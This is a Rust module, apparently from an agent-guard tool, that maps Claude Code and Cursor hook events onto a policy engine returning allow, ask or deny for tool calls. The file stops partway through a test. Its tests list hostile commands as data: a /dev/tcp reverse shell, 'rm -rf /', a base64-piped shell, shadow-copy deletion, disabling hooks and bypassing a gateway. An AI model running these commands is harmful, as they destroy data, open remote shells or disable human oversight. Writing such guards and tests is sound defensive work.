//! Native agent-hook adapter (v1.5).
//!
//! Claude Code `PreToolUse` and Cursor `preToolUse` send a JSON event on
//! stdin describing the tool about to run (Bash, Write, Read, MCP, …).
//! This module maps that event onto the same engine path `--check-cmd`
//! and the MCP middleman already use, then emits the dialect-specific
//! deny JSON the host expects.
//!
//! Exit-code policy (mirrors `--check-cmd`, with a Claude overlay):
//!
//! | Decision                    | Claude stdout                                      | Claude exit | Cursor stdout                         | Cursor exit |
//! |-----------------------------|----------------------------------------------------|-------------|---------------------------------------|-------------|
//! | Allow / Warn                | (empty)                                            | 0           | `{"permission":"allow"}`              | 0           |
//! | Approval / Identity / Block | `hookSpecificOutput.permissionDecision: ask`       | 0           | `{"permission":"ask"}`                | 0           |
//! | Hard block (listed rule)    | `hookSpecificOutput.permissionDecision: deny`      | 2           | `{"permission":"deny"}`               | 2           |
//!
//! A Block only stays a deny when its rule is on the hard-block list
//! (`policy.hard_block`, a rule's `hard_block: true`, or
//! `APERION_SHIELD_HARD_BLOCK`), for the killswitch, or for the offload
//! gate. Everything else asks, because agents run in sandboxes and
//! scratch VMs where a "dangerous" command is often the job.
//!
//! Exit 2 is treated as deny by both hosts — never use it for ask.
//! Cursor only *enforces* ask on `beforeShellExecution` / `beforeMCPExecution`
//! (`preToolUse` accepts the field but does not prompt). The installer
//! registers those events so a High-severity git push is a click, not a wall.
//!
//! APort documents the two JSON shapes as incompatible — we never share
//! one wrapper script between Claude and Cursor.

use anyhow::{anyhow, Result};
use serde::Deserialize;
use serde_json::{json, Value};

use crate::engine::{decide, Adjustments, Decision, Engine, Severity};
use crate::predicates::network_send;
use crate::session::SessionStore;
use crate::taint::TaintLedger;
use crate::{BurstDetector, WorkspaceContext};

use super::offload::{self, OffloadConfig, OffloadVerdict};

/// Which host JSON dialect to emit.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HookDialect {
    Claude,
    Cursor,
}

impl HookDialect {
    pub fn parse(s: &str) -> Result<Self> {
        match s.to_ascii_lowercase().as_str() {
            "claude" | "claude-code" | "anthropic" => Ok(Self::Claude),
            "cursor" => Ok(Self::Cursor),
            "auto" => Err(anyhow!("auto is resolved by detect_dialect(), not parse()")),
            other => {
                anyhow::bail!("unknown --hook-dialect '{other}' (expected claude | cursor | auto)")
            }
        }
    }
}

/// Loose stdin payload. Field names differ across Claude Code, Cursor,
/// and experimental Codex/Gemini ports — we accept the aliases that
/// show up in the wild rather than requiring one schema.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct HookEvent {
    #[serde(default, alias = "hookEventName", alias = "hook_event_name")]
    pub hook_event_name: Option<String>,
    #[serde(default, alias = "toolName", alias = "tool")]
    pub tool_name: Option<String>,
    #[serde(
        default,
        alias = "toolInput",
        alias = "tool_input",
        alias = "arguments",
        alias = "args"
    )]
    pub tool_input: Option<Value>,
    #[serde(default)]
    pub cwd: Option<String>,
    /// `beforeShellExecution` sends `command` at the top level, not as
    /// `tool_name` / `tool_input`.
    #[serde(default)]
    pub command: Option<String>,
    /// Cursor `beforeReadFile` / `afterFileEdit`.
    #[serde(default, alias = "file_path", alias = "filePath")]
    pub file_path: Option<String>,
    /// Cursor `beforeReadFile` includes the file body before the model sees it.
    /// `beforeTabFileRead` uses the same fields.
    #[serde(default)]
    pub content: Option<String>,
    /// Cursor `subagentStart`: the task the subagent is about to run.
    #[serde(default, alias = "prompt")]
    pub task: Option<String>,
    /// Cursor `postToolUse` (`tool_output` is often a JSON string).
    #[serde(
        default,
        alias = "tool_output",
        alias = "toolOutput",
        alias = "tool_response",
        alias = "toolResponse"
    )]
    pub tool_output: Option<Value>,
    /// Cursor `afterShellExecution`.
    #[serde(default)]
    pub output: Option<Value>,
    /// Cursor `afterMCPExecution`.
    #[serde(default, alias = "result_json", alias = "resultJson")]
    pub result_json: Option<Value>,
    #[serde(
        default,
        alias = "conversation_id",
        alias = "conversationId",
        alias = "session_id",
        alias = "sessionId"
    )]
    pub conversation_id: Option<String>,
    /// Claude Code permission mode. Auto, dontAsk, and bypassPermissions
    /// do not stop for an `ask`, so a policy that needs a yes has to deny.
    #[serde(default, alias = "permissionMode")]
    pub permission_mode: Option<String>,
}

fn first_str(v: &Value, keys: &[&str]) -> Option<String> {
    for key in keys {
        if let Some(s) = v.get(*key).and_then(|x| x.as_str()) {
            if !s.is_empty() {
                return Some(s.to_string());
            }
        }
    }
    None
}

fn first_val(v: &Value, keys: &[&str]) -> Option<Value> {
    for key in keys {
        if let Some(value) = v.get(*key) {
            if !value.is_null() {
                return Some(value.clone());
            }
        }
    }
    None
}

impl HookEvent {
    /// Cursor Plan mode sends the same id as `conversation_id` and
    /// `conversationId`. Struct aliases treat that as one field and reject
    /// the payload. Read the keys by name so a hook bug cannot wedge the IDE.
    pub fn from_json(raw: &str) -> Result<Self> {
        let trimmed = raw.trim();
        if trimmed.is_empty() {
            anyhow::bail!("--check-hook requires a JSON event on stdin");
        }
        let value: Value = serde_json::from_str(trimmed)
            .map_err(|e| anyhow!("--check-hook stdin is not JSON: {e}"))?;
        if !value.is_object() {
            anyhow::bail!("--check-hook stdin is not a JSON object");
        }
        Ok(Self {
            hook_event_name: first_str(&value, &["hook_event_name", "hookEventName"]),
            tool_name: first_str(&value, &["tool_name", "toolName", "tool"]),
            tool_input: first_val(&value, &["tool_input", "toolInput", "arguments", "args"]),
            cwd: first_str(&value, &["cwd"]),
            command: first_str(&value, &["command"]),
            file_path: first_str(&value, &["file_path", "filePath"]),
            content: first_str(&value, &["content"]),
            task: first_str(&value, &["task", "prompt"]),
            tool_output: first_val(&value, &["tool_output", "toolOutput", "tool_response", "toolResponse"]),
            output: first_val(&value, &["output"]),
            result_json: first_val(&value, &["result_json", "resultJson"]),
            conversation_id: first_str(&value, &["conversation_id", "conversationId", "session_id", "sessionId"]),
            permission_mode: first_str(&value, &["permission_mode", "permissionMode"]),
        })
    }

    pub fn tool_name(&self) -> &str {
        self.tool_name.as_deref().unwrap_or("")
    }

    pub fn input(&self) -> &Value {
        self.tool_input.as_ref().unwrap_or(&Value::Null)
    }
}

/// Pick a dialect from the payload when the operator passed `auto`.
pub fn detect_dialect(event: &HookEvent) -> HookDialect {
    let name = event
        .hook_event_name
        .as_deref()
        .unwrap_or("")
        .to_ascii_lowercase();
    if name == "beforeshellexecution"
        || name == "beforemcpexecution"
        || name == "aftershellexecution"
        || name == "aftermcpexecution"
        || name == "beforereadfile"
        || name == "afterfileedit"
        || name == "beforetabfileread"
        || name == "subagentstart"
    {
        return HookDialect::Cursor;
    }
    if name == "pretooluse" || name == "posttooluse" {
        // Claude Code uses PascalCase PreToolUse; Cursor uses preToolUse.
        // After lowercasing they collide, so look at the original casing
        // if we still have it: Claude's documented field is PreToolUse.
        if event
            .hook_event_name
            .as_deref()
            .map(|s| s.starts_with("Pre") || s.starts_with("Post"))
            .unwrap_or(false)
        {
            return HookDialect::Claude;
        }
        return HookDialect::Cursor;
    }
    if name.is_empty() {
        // Cursor's early hooks.json payloads often omit hook_event_name.
        return HookDialect::Cursor;
    }
    HookDialect::Claude
}

/// Which program ran the hook, independent of the reply dialect. Cursor runs
/// hooks from Claude Code's settings too, and those arrive as `PreToolUse`,
/// so the dialect alone would count Cursor work as Claude Code.
pub fn detect_host(raw: &str, dialect: HookDialect) -> &'static str {
    let env_cursor = std::env::var("CURSOR_VERSION").map(|v| !v.is_empty()).unwrap_or(false);
    host_from(raw, dialect, env_cursor)
}

fn host_from(raw: &str, dialect: HookDialect, env_cursor: bool) -> &'static str {
    let payload_cursor = serde_json::from_str::<Value>(raw.trim())
        .ok()
        .and_then(|v| v.get("cursor_version").cloned())
        .map(|v| !v.is_null())
        .unwrap_or(false);
    if env_cursor || payload_cursor || dialect == HookDialect::Cursor {
        "cursor"
    } else {
        "claude"
    }
}

/// Result the CLI uses to print JSON + pick an exit code.
#[derive(Debug, Clone)]
pub struct HookReport {
    pub dialect: HookDialect,
    pub tool_name: String,
    pub canonical_tool: String,
    pub decision: Decision,
    pub primary_rule_id: Option<String>,
    pub reason: String,
    pub stdout: String,
    /// False on host events that only accept allow or deny.
    pub can_ask: bool,
    pub event_name: Option<String>,
}

impl HookReport {
    pub fn exit_code(&self) -> i32 {
        // Exit 2 is deny on both hosts. Ask must be 0 plus permission JSON.
        match self.decision {
            Decision::Block { .. } => 2,
            _ => 0,
        }
    }
}

/// Map a host tool name + input onto an engine `(tool, params)` pair.
///
/// Native IDE tools (Bash/Write/Read) are not in the shieldset
/// whitelist as `Bash` — the YAML uses `shell` / `fs.write` / `fs.read`.
/// MCP tools arrive as `mcp__server__tool`; we strip to the last
/// segment and, when the args look like SQL, also evaluate as
/// `execute_sql` (handled by the caller via [`canonical_calls`]).
pub fn canonical_calls(tool_name: &str, input: &Value) -> Vec<(String, Value)> {
    let lower = tool_name.to_ascii_lowercase();
    let mut out = Vec::new();

    if is_shell_tool(&lower) {
        let cmd = extract_command(input);
        out.push((
            "shell".to_string(),
            json!({"name": "shell", "arguments": {"command": cmd}}),
        ));
        return out;
    }

    if is_write_tool(&lower) {
        let path = extract_path(input);
        // `tee <path>` is a write verb, so `fs.sensitive_path_write_or_delete`
        // (which gates on command_writes) fires for ~/.ssh, .env, etc.
        let synthetic = format!("tee {path}");
        out.push((
            "shell".to_string(),
            json!({"name": "shell", "arguments": {"command": synthetic, "path": path}}),
        ));
        out.push((
            "fs.write".to_string(),
            json!({"name": "fs.write", "arguments": {"path": path}}),
        ));
        return out;
    }

    if is_read_tool(&lower) {
        let path = extract_path(input);
        out.push((
            "fs.read".to_string(),
            json!({"name": "fs.read", "arguments": {"path": path}}),
        ));
        out.push((
            "filesystem.read_file".to_string(),
            json!({"name": "filesystem.read_file", "arguments": {"path": path}}),
        ));
        return out;
    }

    if let Some(rest) = strip_mcp_prefix(tool_name) {
        let last = rest.rsplit("__").next().unwrap_or(rest);
        let dotted = rest.replace("__", ".");
        if looks_like_sql(last, input) {
            out.push((
                "execute_sql".to_string(),
                json!({"name": "execute_sql", "arguments": input}),
            ));
        }
        out.push((last.to_string(), json!({"name": last, "arguments": input})));
        if dotted != last {
            out.push((dotted.clone(), json!({"name": dotted, "arguments": input})));
        }
        return out;
    }

    out.push((
        tool_name.to_string(),
        json!({"name": tool_name, "arguments": input}),
    ));
    out
}

pub(crate) fn is_shell_tool(lower: &str) -> bool {
    matches!(
        lower,
        "bash"
            | "shell"
            | "zsh"
            | "sh"
            | "powershell"
            | "pwsh"
            | "cmd"
            | "terminal"
            | "run_terminal"
            | "execute_command"
            | "exec"
            | "runcommand"
            | "run_command"
    )
}

fn is_write_tool(lower: &str) -> bool {
    matches!(
        lower,
        "write"
            | "edit"
            | "multiedit"
            | "notebookedit"
            | "strreplace"
            | "str_replace"
            | "create"
            | "delete"
            | "fs.write"
            | "filesystem.write_file"
    )
}

pub(crate) fn is_read_tool(lower: &str) -> bool {
    matches!(
        lower,
        "read" | "readfile" | "read_file" | "fs.read" | "filesystem.read_file"
    )
}

fn strip_mcp_prefix(name: &str) -> Option<&str> {
    name.strip_prefix("mcp__")
        .or_else(|| name.strip_prefix("mcp_"))
}

fn looks_like_sql(tool: &str, input: &Value) -> bool {
    let t = tool.to_ascii_lowercase();
    if t.contains("sql") || t.contains("query") || t.contains("postgres") || t.contains("mysql") {
        return true;
    }
    input.get("query").is_some() || input.get("sql").is_some() || input.get("statement").is_some()
}

pub(crate) fn extract_command(input: &Value) -> String {
    for key in ["command", "cmd", "script", "code", "input"] {
        if let Some(s) = input.get(key).and_then(|v| v.as_str()) {
            return s.to_string();
        }
    }
    if let Some(s) = input.as_str() {
        return s.to_string();
    }
    input.to_string()
}

pub(crate) fn extract_path(input: &Value) -> String {
    for key in [
        "path",
        "file_path",
        "filePath",
        "filename",
        "file",
        "target",
    ] {
        if let Some(s) = input.get(key).and_then(|v| v.as_str()) {
            return s.to_string();
        }
    }
    // MultiEdit: first edit's path, or a `edits[0].old_string` file.
    if let Some(edits) = input.get("edits").and_then(|v| v.as_array()) {
        if let Some(first) = edits.first() {
            if let Some(s) = first.get("path").and_then(|v| v.as_str()) {
                return s.to_string();
            }
        }
    }
    String::new()
}

fn decision_reason(d: &Decision) -> String {
    match d {
        Decision::Allow => String::new(),
        Decision::Warn { banner, .. } => banner.clone(),
        Decision::Approval { reason, .. }
        | Decision::IdentityVerification { reason, .. }
        | Decision::Block { reason, .. } => reason.clone(),
    }
}

fn decision_rule_id(d: &Decision) -> Option<String> {
    match d {
        Decision::Allow => None,
        Decision::Warn { rule_id, .. }
        | Decision::Approval { rule_id, .. }
        | Decision::IdentityVerification { rule_id, .. }
        | Decision::Block { rule_id, .. } => Some(rule_id.clone()),
    }
}

fn permission_verb(decision: &Decision) -> Option<&'static str> {
    match decision {
        Decision::Allow | Decision::Warn { .. } => Some("allow"),
        Decision::Approval { .. } | Decision::IdentityVerification { .. } => Some("ask"),
        Decision::Block { .. } => Some("deny"),
    }
}

fn reason_full(reason: &str, rule_id: Option<&str>) -> String {
    match rule_id {
        Some(id) if !reason.is_empty() => format!("[{id}] {reason}"),
        Some(id) => format!("blocked by {id}"),
        None => {
            if reason.is_empty() {
                "blocked by aperion-shield".to_string()
            } else {
                reason.to_string()
            }
        }
    }
}

fn render_stdout(
    dialect: HookDialect,
    decision: &Decision,
    reason: &str,
    rule_id: Option<&str>,
) -> String {
    let verb = permission_verb(decision).unwrap_or("allow");
    if verb == "allow" {
        return match dialect {
            HookDialect::Claude => String::new(),
            HookDialect::Cursor => json!({"permission": "allow"}).to_string() + "\n",
        };
    }
    let reason_full = reason_full(reason, rule_id);
    match dialect {
        HookDialect::Claude => {
            json!({
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": verb,
                    "permissionDecisionReason": reason_full,
                }
            })
            .to_string()
                + "\n"
        }
        HookDialect::Cursor => {
            json!({
                "permission": verb,
                "user_message": reason_full,
                "agent_message": reason_full,
                "permissionDecisionReason": reason_full,
            })
            .to_string()
                + "\n"
        }
    }
}

/// Turn an allow or warn into an approve / deny prompt. Block and
/// approval decisions are left alone.
pub fn ask_floor(mut report: HookReport, rule_id: &str, reason: &str) -> HookReport {
    if !matches!(report.decision, Decision::Allow | Decision::Warn { .. }) {
        return report;
    }
    report.decision = hold_ask(
        None,
        report.can_ask,
        Decision::Approval {
            rule_id: rule_id.to_string(),
            severity: Severity::High,
            reason: reason.to_string(),
            safer_alternative: None,
            contributing_rules: Vec::new(),
        },
    );
    report.primary_rule_id = Some(rule_id.to_string());
    report.reason = decision_reason(&report.decision);
    report.stdout = render_for_event(
        report.event_name.as_deref(),
        report.dialect,
        &report.decision,
        &report.reason,
        Some(rule_id),
    );
    report
}

/// Evaluate a parsed hook event against the engine. The I/O offload
/// gate threshold comes from `APERION_SHIELD_OFFLOAD_MIN_LINES`, else
/// the shieldset's `policy.io_offload.min_lines` (off by default).
pub fn run(
    engine: &Engine,
    event: &HookEvent,
    dialect: HookDialect,
    taint: Option<&TaintLedger>,
) -> Result<HookReport> {
    let ttl = taint
        .map(|t| t.ttl_secs())
        .unwrap_or(crate::taint::DEFAULT_TTL_SECS);
    run_with_offload(
        engine,
        event,
        dialect,
        taint,
        &OffloadConfig::resolve(&engine.policy),
        &SessionStore::open(ttl),
    )
}

/// [`run`] with an explicit offload config (tests, embedders).
pub fn run_with_offload(
    engine: &Engine,
    event: &HookEvent,
    dialect: HookDialect,
    taint: Option<&TaintLedger>,
    offload_cfg: &OffloadConfig,
    session: &SessionStore,
) -> Result<HookReport> {
    let mut tool_name = event.tool_name().to_string();
    let mut input = event.input().clone();

    // Cursor `beforeShellExecution` has no tool_name — only `command` + `cwd`.
    if tool_name.is_empty() {
        if let Some(cmd) = event.command.as_deref().filter(|s| !s.is_empty()) {
            tool_name = "Bash".to_string();
            input = json!({ "command": cmd });
        } else if let Some(cmd) = input.get("command").and_then(|v| v.as_str()) {
            if !cmd.is_empty() {
                tool_name = "Bash".to_string();
                input = json!({ "command": cmd });
            }
        } else if event
            .hook_event_name
            .as_deref()
            .is_some_and(|n| n.eq_ignore_ascii_case("subagentStart"))
        {
            // No tool name. The task is what the subagent will act on, so
            // it goes through the same shell rules as a command.
            let task = event.task.clone().unwrap_or_default();
            if task.is_empty() {
                tool_name = "Task".to_string();
                input = json!({});
            } else {
                tool_name = "Bash".to_string();
                input = json!({ "command": task });
            }
        } else if event
            .hook_event_name
            .as_deref()
            .is_some_and(is_prompt_event)
        {
            let prompt = event.task.clone().or(event.content.clone()).unwrap_or_default();
            tool_name = "UserPrompt".to_string();
            input = json!({ "prompt": prompt });
        } else if let Some(path) = event.file_path.as_deref().filter(|s| !s.is_empty()) {
            // beforeReadFile and beforeTabFileRead: file_path + content, no tool_name.
            let event_name = event.hook_event_name.as_deref().unwrap_or("");
            tool_name = if event_name.eq_ignore_ascii_case("afterFileEdit") {
                "Write".to_string()
            } else {
                "Read".to_string()
            };
            input = json!({ "path": path, "file_path": path });
        }
    }
    if tool_name.is_empty() {
        anyhow::bail!("--check-hook JSON is missing tool_name");
    }
    // beforeMCPExecution sends tool_input as a JSON string.
    if let Value::String(s) = &input {
        if let Ok(v) = serde_json::from_str::<Value>(s) {
            input = v;
        }
    }

    let cwd = event
        .cwd
        .as_deref()
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| {
            std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."))
        });
    let workspace = WorkspaceContext::probe_at(&engine.policy, &cwd);
    let burst = BurstDetector::new(engine.policy.burst_detector.clone());

    let calls = canonical_calls(&tool_name, &input);
    let mut best = if crate::orgmode::killswitch_latched() {
        Decision::Block {
            rule_id: "killswitch".into(),
            severity: Severity::Critical,
            reason: "Smartflow killswitch is on".into(),
            safer_alternative: None,
            contributing_rules: Vec::new(),
        }
    } else {
        Decision::Allow
    };
    let mut canonical_tool = calls
        .first()
        .map(|(t, _)| t.clone())
        .unwrap_or_else(|| tool_name.clone());

    // I/O offload gate: an unbounded read of a large file is refused
    // before the security rules even run. Cost, not safety, but the
    // seam is the same. Security rules still evaluate below and a
    // higher-ranked decision (identity, etc.) wins.
    if let OffloadVerdict::Block { reason, .. } =
        offload::check(offload_cfg, &tool_name, &input, &cwd)
    {
        best = Decision::Block {
            rule_id: offload::RULE_ID.to_string(),
            severity: Severity::Low,
            reason,
            safer_alternative: Some("aperion-shield --summarize <path>".to_string()),
            contributing_rules: Vec::new(),
        };
    }

    for (tool, params) in &calls {
        let blob = params.to_string();
        let taint_hit = taint.and_then(|t| t.check(&blob));
        let adj = Adjustments {
            workspace_is_prod: workspace.is_prod,
            burst_in_progress: burst.in_burst(),
            tainted_secret_in_flight: taint_hit.is_some(),
            ..Default::default()
        };
        let eval = engine.evaluate(tool, params, adj);
        let decision = decide(&eval);
        if rank_decision(&decision) > rank_decision(&best) {
            canonical_tool = tool.clone();
            best = decision;
        }
        // where: agent_hook. Not visible to MCP or shell shims.
        let hook_eval = engine.evaluate_agent_hook(tool, params, adj);
        let hook_decision = decide(&hook_eval);
        if rank_decision(&hook_decision) > rank_decision(&best) {
            canonical_tool = tool.clone();
            best = hook_decision;
        }
    }

    let cwd_label = cwd.display().to_string();
    if let Some(cmd) = shell_command_of(&calls) {
        let flags = session.flags();
        let blob = cmd.clone();
        let taint_hit = taint.and_then(|t| t.check(&blob)).is_some();
        if network_send(&cmd) && (flags.tainted || taint_hit) {
            consider(&mut best, &mut canonical_tool, "shell", egress_ask());
        } else if network_send(&cmd) && flags.injected {
            consider(&mut best, &mut canonical_tool, "shell", egress_approval());
        }
    }

    // beforeReadFile already has the body. Scan it before the model does.
    let output = super::post::event_output(event);
    if !output.is_empty() {
        let input_blob = format!("{} {}", input, event.file_path.as_deref().unwrap_or(""));
        let found = super::post::inspect(
            engine,
            &tool_name,
            &input_blob,
            &output,
            &cwd_label,
            taint,
            session,
        );
        if found.injected && rank_decision(&found.decision) > rank_decision(&best) {
            canonical_tool = tool_name.clone();
            best = found.decision;
        }
    }

    // IDE hooks: only hard-block rules deny. Cursor's beforeShellExecution /
    // beforeMCPExecution and Claude's PreToolUse both prompt on `ask`, and
    // skip the prompt if we exit 2 with `deny`. Auto mode drops `ask` on
    // the floor, so that decision becomes a deny there.
    best = soften_non_attack(engine, best);
    let can_ask = event_can_ask(event.hook_event_name.as_deref());
    best = hold_ask(event.permission_mode.as_deref(), can_ask, best);

    let reason = decision_reason(&best);
    let primary_rule_id = decision_rule_id(&best);
    let event_name = event.hook_event_name.clone();
    let stdout = render_for_event(event_name.as_deref(), dialect, &best, &reason, primary_rule_id.as_deref());

    Ok(HookReport {
        dialect,
        tool_name,
        canonical_tool,
        decision: best,
        primary_rule_id,
        reason,
        stdout,
        can_ask,
        event_name,
    })
}

fn shell_command_of(calls: &[(String, Value)]) -> Option<String> {
    calls.iter().find_map(|(tool, params)| {
        if tool != "shell" {
            return None;
        }
        params
            .pointer("/arguments/command")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
    })
}

fn consider(best: &mut Decision, canonical: &mut String, tool: &str, decision: Decision) {
    if rank_decision(&decision) > rank_decision(best) {
        *canonical = tool.to_string();
        *best = decision;
    }
}

fn egress_ask() -> Decision {
    Decision::Approval {
        rule_id: "egress.after_secret_read".to_string(),
        severity: Severity::High,
        reason:
            "This session already read a credential, and this command sends data off the machine."
                .to_string(),
        safer_alternative: Some(
            "Approve only if you asked for this send. Otherwise deny and rotate what was read."
                .to_string(),
        ),
        contributing_rules: Vec::new(),
    }
}

/// Keep a hard deny for hard-block rules, the killswitch, and the offload
/// gate. Every other Block becomes the same approve / deny prompt that
/// High rules use.
fn soften_non_attack(engine: &Engine, decision: Decision) -> Decision {
    if let Decision::Approval {
        rule_id,
        severity,
        reason,
        safer_alternative,
        contributing_rules,
    } = &decision
    {
        if engine.is_hard_block(rule_id) {
            return Decision::Block {
                rule_id: rule_id.clone(),
                severity: *severity,
                reason: reason.clone(),
                safer_alternative: safer_alternative.clone(),
                contributing_rules: contributing_rules.clone(),
            };
        }
        return decision;
    }
    let Decision::Block {
        severity,
        rule_id,
        reason,
        safer_alternative,
        contributing_rules,
    } = decision.clone()
    else {
        return decision;
    };
    if rule_id == offload::RULE_ID || engine.is_hard_block(&rule_id) {
        return decision;
    }
    Decision::Approval {
        rule_id,
        severity,
        reason,
        safer_alternative,
        contributing_rules,
    }
}

fn egress_approval() -> Decision {
    Decision::Approval {
        rule_id: "egress.after_injection".to_string(),
        severity: Severity::High,
        reason: "This session saw injected instructions in a tool result, and this command sends data off the machine."
            .to_string(),
        safer_alternative: Some(
            "Treat the earlier tool output as hostile. Do not run the send it asked for."
                .to_string(),
        ),
        contributing_rules: Vec::new(),
    }
}

/// Auto, dontAsk, and bypassPermissions do not pause for `ask`. A policy
/// that needed a person to say yes is a deny in those modes.
/// Cursor's file-read hooks accept only allow or deny. An `ask` there is an
/// invalid response, and a fail-closed hook then blocks with no reason shown.
fn event_can_ask(event_name: Option<&str>) -> bool {
    !matches!(
        event_name.unwrap_or("").to_ascii_lowercase().as_str(),
        "beforereadfile" | "beforetabfileread" | "beforesubmitprompt"
    )
}

/// Claude Code calls it UserPromptSubmit; Cursor sends beforeSubmitPrompt,
/// including when it runs hooks from Claude Code's settings.
fn is_prompt_event(name: &str) -> bool {
    name.eq_ignore_ascii_case("UserPromptSubmit") || name.eq_ignore_ascii_case("beforeSubmitPrompt")
}

/// Cursor's beforeSubmitPrompt answers with `continue`, not `permission`.
fn render_prompt_stdout(decision: &Decision, reason: &str, rule_id: Option<&str>) -> String {
    let out = match decision {
        Decision::Block { .. } => json!({"continue": false, "user_message": reason_full(reason, rule_id)}),
        _ => json!({"continue": true}),
    };
    out.to_string() + "\n"
}

fn render_for_event(
    event_name: Option<&str>,
    dialect: HookDialect,
    decision: &Decision,
    reason: &str,
    rule_id: Option<&str>,
) -> String {
    if event_name.is_some_and(|n| n.eq_ignore_ascii_case("beforeSubmitPrompt")) {
        render_prompt_stdout(decision, reason, rule_id)
    } else {
        render_stdout(dialect, decision, reason, rule_id)
    }
}

fn hold_ask(mode: Option<&str>, can_ask: bool, decision: Decision) -> Decision {
    let dropped = matches!(
        mode.unwrap_or("").to_ascii_lowercase().as_str(),
        "auto" | "dontask" | "bypasspermissions"
    );
    if !dropped && can_ask {
        return decision;
    }
    let note = if can_ask {
        "This session does not stop for approval, so the call was blocked."
    } else {
        "Cursor cannot ask for approval on a file read, so the read was blocked."
    };
    match decision {
        Decision::Approval {
            rule_id,
            severity,
            reason,
            safer_alternative,
            contributing_rules,
        }
        | Decision::IdentityVerification {
            rule_id,
            severity,
            reason,
            safer_alternative,
            contributing_rules,
            ..
        } => Decision::Block {
            rule_id,
            severity,
            reason: format!("{reason} {note}"),
            safer_alternative,
            contributing_rules,
        },
        other => other,
    }
}

pub(crate) fn rank_decision(d: &Decision) -> u8 {
    match d {
        Decision::Allow => 0,
        Decision::Warn { .. } => 1,
        Decision::Approval { .. } => 2,
        Decision::IdentityVerification { .. } => 3,
        Decision::Block { .. } => 4,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Engine;

    fn engine() -> Engine {
        Engine::builtin_default()
    }

    fn eval_named(tool: &str, input: Value, dialect: HookDialect) -> HookReport {
        let event = HookEvent {
            tool_name: Some(tool.into()),
            tool_input: Some(input),
            ..Default::default()
        };
        run(&engine(), &event, dialect, None).expect("run")
    }

    #[test]
    fn auto_mode_blocks_a_call_that_would_have_asked() {
        let event = HookEvent {
            tool_name: Some("Bash".into()),
            tool_input: Some(json!({"command": "rm -rf /"})),
            permission_mode: Some("auto".into()),
            ..Default::default()
        };
        let report = run(&engine(), &event, HookDialect::Claude, None).expect("run");
        assert!(matches!(report.decision, Decision::Block { .. }), "{:?}", report.decision);
        assert_eq!(report.exit_code(), 2);
        assert!(report.stdout.contains("\"permissionDecision\":\"deny\""));
    }

    #[test]
    fn user_prompt_is_logged_as_an_allow() {
        let event = HookEvent {
            hook_event_name: Some("UserPromptSubmit".into()),
            task: Some("Build me a simple python date picker sample".into()),
            ..Default::default()
        };
        let report = run(&engine(), &event, HookDialect::Claude, None).expect("run");
        assert!(matches!(report.decision, Decision::Allow), "{:?}", report.decision);
        assert_eq!(report.tool_name, "UserPrompt");
        assert_eq!(report.exit_code(), 0);
    }

    #[test]
    fn cursor_prompt_event_is_read_as_a_prompt() {
        let raw = r#"{"hook_event_name":"beforeSubmitPrompt","prompt":"Build me a date picker","attachments":[],"cursor_version":"3.29.15"}"#;
        let event = HookEvent::from_json(raw).expect("parse");
        let report = run(&engine(), &event, detect_dialect(&event), None).expect("run");
        assert_eq!(report.tool_name, "UserPrompt");
        assert_eq!(report.exit_code(), 0);
        assert_eq!(report.stdout.trim(), r#"{"continue":true}"#);

        let blocked = Decision::Block {
            rule_id: "r".into(),
            severity: Severity::High,
            reason: "why".into(),
            safer_alternative: None,
            contributing_rules: Vec::new(),
        };
        let out = render_for_event(Some("beforeSubmitPrompt"), HookDialect::Claude, &blocked, "why", Some("r"));
        assert!(out.contains("\"continue\":false"), "{out}");
        assert!(out.contains("[r] why"), "{out}");
    }

    #[test]
    fn bash_rm_rf_root_asks_claude() {
        let report = eval_named("Bash", json!({"command": "rm -rf /"}), HookDialect::Claude);
        assert!(
            matches!(report.decision, Decision::Approval { .. }),
            "decision={:?}",
            report.decision
        );
        assert_eq!(report.exit_code(), 0);
        assert!(report.stdout.contains("\"permissionDecision\":\"ask\""));
        assert!(!report.stdout.contains("\"permission\":"));
    }

    #[test]
    fn hard_block_rule_denies_in_both_dialects() {
        let cmd = json!({"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"});
        let claude = eval_named("Bash", cmd.clone(), HookDialect::Claude);
        assert!(matches!(claude.decision, Decision::Block { .. }), "{:?}", claude.decision);
        assert_eq!(claude.exit_code(), 2);
        assert!(claude.stdout.contains("\"permissionDecision\":\"deny\""));

        let cursor = eval_named("Shell", cmd, HookDialect::Cursor);
        assert_eq!(cursor.exit_code(), 2);
        assert!(cursor.stdout.contains("\"permission\":\"deny\""));
    }

    #[test]
    fn claude_settings_edit_is_hard_denied() {
        for path in [
            "/Users/a/.claude/settings.local.json",
            "/Library/Application Support/ClaudeCode/managed-settings.json",
        ] {
            let r = eval_named("Write", json!({"file_path": path}), HookDialect::Claude);
            assert_eq!(r.exit_code(), 2, "{path}: {:?}", r.decision);
        }
        let r = eval_named(
            "Bash",
            json!({"command": "jq '.disableAllHooks=true' x > y"}),
            HookDialect::Claude,
        );
        assert_eq!(r.exit_code(), 2, "{:?}", r.decision);
    }

    #[test]
    fn extended_rules_ask_not_deny() {
        for cmd in [
            "rm -rf /home",
            "aws ec2 terminate-instances --instance-ids i-1",
            "az keyvault purge --name kv1",
            "kubectl delete pvc --all -n prod",
            "docker run --privileged -v /:/host alpine",
            "vssadmin delete shadows /all /quiet",
            "echo aGk= | base64 -d | sh",
            "ngrok http 3000",
            "claude --dangerously-skip-permissions -p 'fix it'",
        ] {
            let r = eval_named("Bash", json!({"command": cmd}), HookDialect::Claude);
            assert!(
                matches!(r.decision, Decision::Approval { .. }),
                "{cmd}: {:?}",
                r.decision
            );
            assert_eq!(r.exit_code(), 0, "{cmd}");
            assert!(r.stdout.contains("\"permissionDecision\":\"ask\""), "{cmd}");
        }
    }

    #[test]
    fn gateway_bypass_is_hard_denied() {
        let r = eval_named(
            "Bash",
            json!({"command": "export ANTHROPIC_BASE_URL=https://api.anthropic.com && claude"}),
            HookDialect::Claude,
        );
        assert_eq!(r.exit_code(), 2, "{:?}", r.decision);
    }

    #[test]
    fn everyday_commands_still_allow() {
        for cmd in [
            "rm -rf ./build",
            "rm -rf node_modules",
            "git push origin feature/x",
            "kubectl get pods -n prod",
            "aws s3 ls",
